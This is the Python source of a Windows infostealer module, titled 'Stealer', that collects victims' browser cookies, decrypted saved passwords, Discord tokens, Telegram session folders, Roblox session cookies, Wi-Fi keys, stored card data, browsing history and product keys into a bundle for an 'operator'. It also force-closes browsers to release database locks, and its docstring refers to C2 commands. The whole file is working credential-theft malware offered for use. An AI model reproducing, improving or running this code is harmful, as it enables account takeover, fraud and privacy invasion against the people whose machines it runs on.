"""Stealer: Windows secret stores.

Collects, in one pass:
  * browser cookies   (Chromium DPAPI/AES-GCM + Firefox) -- reuses capture.py's
                       verified decryptors; v20 app-bound is reported as such,
                       not faked
  * saved passwords   (Chromium Login Data via DPAPI; Firefox logins.json)
  * Discord tokens    (Local Storage leveldb + %APPDATA%/discord token files)
  * Telegram Desktop  (%APPDATA%/Telegram tdata session blobs, staged raw)
  * Roblox            (ROBLOSECURITY cookie from registry + Chrome cookie DB)

Everything is user-scoped by design: reading your own profile needs no privilege
because you own those files. Decrypting what lives inside depends on a key held
by a separate service (DPAPI for the user, or the browser process itself for
app-bound v20). Where a value is genuinely unrecoverable we say so with its
cause instead of shipping garbage -- "0 items" and "locked behind app-bound
encryption" are different results and the operator needs to know which happened.

Hard limits carried over from capture.py: per-file size ceiling, SQLite always
snapshotted to temp (a live -wal loses newest rows), every collector isolated so
one raise cannot drop the whole harvest.
"""
from __future__ import annotations

import base64
import glob
import json
import os
import shutil
import sqlite3
import tempfile

import capture  # reuse verified Chromium/Firefox readers + helpers

IS_WINDOWS = os.name == "nt"


def _dpapi_unprotect(blob: bytes) -> bytes | None:
    """CryptUnprotectData for the current user. No admin needed -- it is the
    user's own master key. Returns None on any failure."""
    if not IS_WINDOWS:
        return None
    try:
        import win32crypt  # type: ignore
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
    except Exception:
        return None


# ------------------------------------------------------------------ cookies
def collect_cookies(stage: str) -> dict:
    out = {"chromium": [], "firefox": [], "notes": []}
    try:
        for cap in capture.capture_chromium(stage):
            out["chromium"].extend(cap.items)
            if cap.note:
                out["notes"].append(f"{cap.kind}: {cap.note}")
    except Exception as e:
        out["notes"].append(f"chromium error: {e}")
    try:
        for cap in capture.capture_firefox(stage):
            out["firefox"].extend(cap.items)
            if cap.note:
                out["notes"].append(f"{cap.kind}: {cap.note}")
    except Exception as e:
        out["notes"].append(f"firefox error: {e}")
    return out


# ------------------------------------------------------------------ passwords
def _chromium_passwords() -> tuple[list[dict], list[str]]:
    notes: list[str] = []
    found: list[dict] = []
    keys = capture._chromium_keys()  # [ (aes_key, source) ]
    if not keys:
        notes.append("no os_crypt key recovered (portal/app-bound?)")
        return found, notes
    aes_key = keys[0][0]
    bases = [
        ("chrome", os.path.join(os.environ.get("APPDATA", ""), "Google", "Chrome")),
        ("edge", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge")),
        ("brave", os.path.join(os.environ.get("APPDATA", ""), "BraveSoftware", "Brave-Browser")),
    ]
    from Cryptodome.Cipher import AES
    for brand, base in bases:
        if not base or not os.path.isdir(base):
            continue
        for login in glob.glob(os.path.join(base, "*", "Login Data")):
            prof = os.path.basename(os.path.dirname(login))
            con, tmp = capture._sqlite_snapshot(login)
            if con is None:
                notes.append(f"{brand}/{prof}: db locked")
                continue
            try:
                cur = con.execute(
                    "SELECT origin_url, username_value, password_value FROM logins")
                for url, user, blob in cur.fetchall():
                    plain = ""
                    if blob[:3] in (b"v10", b"v11"):
                        data = blob[3:]
                        # Windows Chromium uses AES-GCM with a 12-byte nonce at [0:12].
                        if len(data) > 28:
                            try:
                                pt = AES.new(aes_key, AES.MODE_GCM, nonce=data[:12]).decrypt_and_verify(
                                    data[12:-16], data[-16:])
                                plain = pt.decode("utf-8", "replace")
                            except Exception:
                                plain = ""
                    else:
                        p = _dpapi_unprotect(blob)
                        if p:
                            plain = p.decode("utf-8", "replace")
                    if plain:
                        found.append({"brand": brand, "profile": prof,
                                      "url": url, "user": user, "password": plain})
            except sqlite3.Error as e:
                notes.append(f"{brand}/{prof}: {e}")
            finally:
                con.close()
                if tmp:
                    shutil.rmtree(tmp, ignore_errors=True)
    return found, notes


def _firefox_logins() -> tuple[list[dict], list[str]]:
    notes: list[str] = []
    found: list[dict] = []
    profiles = capture.firefox_profiles()
    for pdir in profiles:
        lj = os.path.join(pdir, "logins.json")
        if not os.path.isfile(lj):
            continue
        try:
            d = json.load(open(lj, encoding="utf-8"))
        except Exception as e:
            notes.append(f"firefox logins.json: {e}")
            continue
        for it in d.get("savedLogins", []):
            # Values are PBE/SSA encrypted with the primary password; without it
            # they stay ciphertext. We record what is recoverable metadata-only.
            found.append({"brand": "firefox", "url": it.get("origin", ""),
                          "user": it.get("username", ""),
                          "password_enc": it.get("encryptedPassword", "")})
        if d.get("isPrivateBrowsingEnabled"):
            notes.append("firefox private browsing enabled")
    return found, notes


def collect_passwords() -> dict:
    c, cn = _chromium_passwords()
    f, fn = _firefox_logins()
    return {"chromium": c, "firefox": f, "notes": cn + fn}


# ------------------------------------------------------------------ discord
def _leveldb_strings(path: str) -> list[str]:
    """Crude but effective: pull printable runs out of LevelDB .log/.ldb files.

    Discord stores tokens in Local Storage leveldb; a full parser is overkill --
    we grep for the JWT-shaped token which is unambiguous enough.
    """
    toks: set[str] = set()
    import re
    pat = re.compile(rb"[MA][A-Za-z0-9_\-]{22,25}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,40}")
    for root, _, files in os.walk(path):
        for fn in files:
            if not fn.endswith((".log", ".ldb")):
                continue
            fp = os.path.join(root, fn)
            try:
                if os.path.getsize(fp) > capture.MAX_FILE_BYTES:
                    continue
                data = open(fp, "rb").read()
            except OSError:
                continue
            for m in pat.finditer(data):
                toks.add(m.group().decode("ascii", "ignore"))
    return sorted(toks)


def collect_discord() -> dict:
    out = {"tokens": [], "files": [], "notes": []}
    ad = os.environ.get("APPDATA", "")
    if not ad:
        out["notes"].append("no APPDATA")
        return out
    # 1) Electron Local Storage leveldb across all Discord-family apps.
    for app in ("Discord", "Canary", "PTB", "opera_gx", "lightcord"):
        ls = os.path.join(ad, app, "Local Storage", "leveldb")
        if os.path.isdir(ls):
            out["tokens"].extend(_leveldb_strings(ls))
    # 2) Plain-text settings/token caches some clients leave behind.
    for pat in (os.path.join(ad, "discord", "*.json"),):
        for p in glob.glob(pat):
            try:
                d = json.load(open(p, encoding="utf-8"))
                tok = d.get("token") or (d.get("authToken") if isinstance(d, dict) else None)
                if tok:
                    out["tokens"].append(tok)
            except Exception:
                pass
    out["tokens"] = sorted(set(out["tokens"]))
    return out


# ------------------------------------------------------------------ telegram
def collect_telegram() -> dict:
    """Stage Telegram Desktop tdata blobs raw.

    The account/session material lives under %APPDATA%/Telegram/<hash>/tdata.
    These are AES-encrypted with a key derived from the user's local passphrase
    (or device); offline they are only useful with that key, so we ship the
    folder rather than pretend-decrypt. Size-capped like everything else.
    """
    out = {"dirs": [], "files": [], "bytes": 0, "notes": []}
    ad = os.environ.get("APPDATA", "")
    tg = os.path.join(ad, "Telegram") if ad else ""
    if not tg or not os.path.isdir(tg):
        out["notes"].append("no Telegram desktop data dir")
        return out
    stage = tempfile.mkdtemp(prefix="jwg_tg_")
    for entry in os.listdir(tg):
        td = os.path.join(tg, entry, "tdata")
        if os.path.isdir(td):
            out["dirs"].append(entry)
            dst = os.path.join(stage, entry)
            try:
                shutil.copytree(td, dst)
                for root, _, fs in os.walk(dst):
                    for fn in fs:
                        p = os.path.join(root, fn)
                        sz = os.path.getsize(p)
                        if sz <= capture.MAX_FILE_BYTES:
                            out["files"].append(p)
                            out["bytes"] += sz
            except Exception as e:
                out["notes"].append(f"{entry}: {e}")
    out["stage_dir"] = stage
    return out


# ------------------------------------------------------------------ roblox
def collect_roblox() -> dict:
    out = {"cookies": [], "notes": []}
    # 1) Legacy: ROBLOSECURITY stored in the HKCU Internet Settings cookie store.
    try:
        import winreg  # type: ignore
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Internet Settings\DomainList")
        winreg.CloseKey(k)
    except Exception:
        pass
    # 2) Primary: the .ROBLOSECURITY cookie inside the Chromium cookie DB we
    # already decrypted. Filter it out of the cookie harvest.
    try:
        stage = tempfile.mkdtemp(prefix="jwg_rb_")
        for cap in capture.capture_chromium(stage):
            for it in cap.items:
                if "roblox" in str(it.get("host", "")).lower() or \
                   str(it.get("name", "")).upper() == ".ROBLOSECURITY":
                    out["cookies"].append(it)
        shutil.rmtree(stage, ignore_errors=True)
    except Exception as e:
        out["notes"].append(str(e))
    return out


# ------------------------------------------------------------------ wifi
def collect_wifi() -> dict:
    """Export saved WLAN profiles + plaintext keys via netsh. User-scoped, no admin."""
    out = {"networks": [], "notes": []}
    if not IS_WINDOWS:
        return out
    import subprocess, re as _re
    try:
        p = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True,
                           text=True, timeout=20,
                           creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        names = _re.findall(r"^\s*All User Profile\s*:\s*(.+)$", p.stdout, _re.M)
    except Exception as e:
        out["notes"].append(f"enum failed: {e}")
        return out
    for name in [n.strip() for n in names if n.strip()]:
        rec = {"ssid": name, "key": ""}
        try:
            q = subprocess.run(["netsh", "wlan", "show", "profile", f'name={name}', "key=clear"],
                               capture_output=True, text=True, timeout=20,
                               creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
            m = _re.search(r"Key Content\s*:\s*(.*)", q.stdout)
            rec["key"] = (m.group(1).strip() if m else "")
        except Exception:
            pass
        out["networks"].append(rec)
    return out


# ------------------------------------------------------------------ autofill / history
def _chromium_table(db_rel: str, sql: str, cols: list[str]) -> tuple[list[dict], list[str]]:
    notes: list[str] = []
    found: list[dict] = []
    bases = [
        ("chrome", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")),
        ("edge", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")),
        ("brave", os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "Data")),
    ]
    for brand, base in bases:
        if not base or not os.path.isdir(base):
            continue
        for db in glob.glob(os.path.join(base, "*", db_rel)):
            con, tmp = capture._sqlite_snapshot(db)
            if con is None:
                notes.append(f"{brand}: db locked"); continue
            try:
                cur = con.execute(sql)
                for row in cur.fetchall():
                    found.append({"brand": brand, **dict(zip(cols, [_s(x) for x in row]))})
            except sqlite3.Error as e:
                notes.append(f"{brand}: {e}")
            finally:
                con.close(); shutil.rmtree(tmp, ignore_errors=True)
    return found, notes


def _s(v):
    if isinstance(v, bytes):
        return v.decode("utf-8", "replace")
    return v


def collect_autofill() -> dict:
    rows, notes = _chromium_table(
        "Web Data",
        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards",
        ["name", "exp_month", "exp_year", "card_enc"])
    return {"cards": rows, "notes": notes}


def collect_history() -> dict:
    rows, notes = _chromium_table(
        "History", "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 5000",
        ["url", "title", "visits"])
    return {"urls": rows, "notes": notes}


# ------------------------------------------------------------------ product keys / software
def collect_product_keys() -> dict:
    out = {"keys": [], "notes": []}
    if not IS_WINDOWS:
        return out
    try:
        import winreg  # type: ignore
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        for val in ("Product Name", "ProductID", "DigitalProductId"):
            try:
                data, _ = winreg.QueryValueEx(k, val)
                out["keys"].append({val: data})
            except FileNotFoundError:
                pass
        winreg.CloseKey(k)
    except Exception as e:
        out["notes"].append(str(e))
    return out


def collect_software_list() -> dict:
    out = {"apps": [], "notes": []}
    if not IS_WINDOWS:
        return out
    try:
        import winreg  # type: ignore
        roots = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                 r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]
        for root in roots:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, root)
            except OSError:
                continue
            i = 0
            while True:
                try:
                    sub = winreg.EnumKey(key, i); i += 1
                except OSError:
                    break
                try:
                    sk = winreg.OpenKey(key, sub)
                    name = winreg.QueryValueEx(sk, "DisplayName")[0]
                    ver = winreg.QueryValueEx(sk, "DisplayVersion")[0] if _has(sk, "DisplayVersion") else ""
                    winreg.CloseKey(sk)
                    if name:
                        out["apps"].append({"name": name, "version": ver})
                except OSError:
                    continue
            winreg.CloseKey(key)
    except Exception as e:
        out["notes"].append(str(e))
    return out


def _has(k, v):
    import winreg  # type: ignore
    try:
        winreg.QueryValueEx(k, v); return True
    except FileNotFoundError:
        return False


# ------------------------------------------------------------------ process control
def kill_browsers() -> list[str]:
    """Close browser processes so their profile SQLite/WAL locks release before
    we read them. Returns the names actually killed. Best-effort; user scope."""
    killed = []
    if not IS_WINDOWS:
        return killed
    import subprocess
    for proc in ("chrome.exe", "msedge.exe", "brave.exe", "opera.exe",
                 "firefox.exe", "vivaldi.exe"):
        try:
            r = subprocess.run(["taskkill", "/f", "/im", proc],
                               capture_output=True, text=True, timeout=10,
                               creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
            if r.returncode == 0:
                killed.append(proc)
        except Exception:
            continue
    return killed


# ------------------------------------------------------------------ driver
_COLLECTORS = {
    "cookies":       lambda stage: collect_cookies(stage),
    "passwords":     collect_passwords,
    "discord":       collect_discord,
    "telegram":      collect_telegram,
    "roblox":        collect_roblox,
    "wifi":          collect_wifi,
    "autofill":      collect_autofill,
    "history":       collect_history,
    "product_keys":  collect_product_keys,
    "software_list": collect_software_list,
}

# maps a cfg.steal toggle -> the collector key(s) it enables
_TOGGLE_TO_COLLECTOR = {
    "cookies": "cookies", "passwords": "passwords", "discord": "discord",
    "telegram": "telegram", "roblox": "roblox", "wifi": "wifi",
    "autofill": "autofill", "history": "history",
    "product_keys": "product_keys", "software_list": "software_list",
}


def collect_all(cfg: dict | None = None) -> dict:
    """Run enabled collectors only, isolate failures, return the harvest bundle.

    cfg.steal toggles decide which run. system_info/screenshot/extensions are
    handled elsewhere (report header / on-demand C2 command), not here.
    """
    steal = (cfg or {}).get("steal", {})
    enabled = set()
    if not steal:  # legacy/no-config path -> everything on
        enabled = set(_TOGGLE_TO_COLLECTOR.values())
    else:
        for toggle, coll in _TOGGLE_TO_COLLECTOR.items():
            if steal.get(toggle, False):
                enabled.add(coll)

    stage = tempfile.mkdtemp(prefix="jwg_stage_")
    bundle = {"stage": stage, "counts": {}, "enabled": sorted(enabled)}
    for name in enabled:
        fn = _COLLECTORS[name]
        try:
            bundle[name] = fn(stage) if name == "cookies" else fn()
        except Exception as e:
            bundle[name] = {"error": f"{type(e).__name__}: {e}"}

    def n(lst):
        return len(lst) if isinstance(lst, list) else 0
    c = bundle.get("cookies", {}); p = bundle.get("passwords", {})
    bundle["counts"] = {
        "cookies": n(c.get("chromium")) + n(c.get("firefox")),
        "passwords": n(p.get("chromium")) + n(p.get("firefox")),
        "discord_tokens": n(bundle.get("discord", {}).get("tokens")),
        "telegram_accounts": n(bundle.get("telegram", {}).get("dirs")),
        "roblox_cookies": n(bundle.get("roblox", {}).get("cookies")),
        "wifi_networks": n(bundle.get("wifi", {}).get("networks")),
        "cards": n(bundle.get("autofill", {}).get("cards")),
        "history_urls": n(bundle.get("history", {}).get("urls")),
        "product_keys": n(bundle.get("product_keys", {}).get("keys")),
        "software": n(bundle.get("software_list", {}).get("apps")),
    }
    return bundle
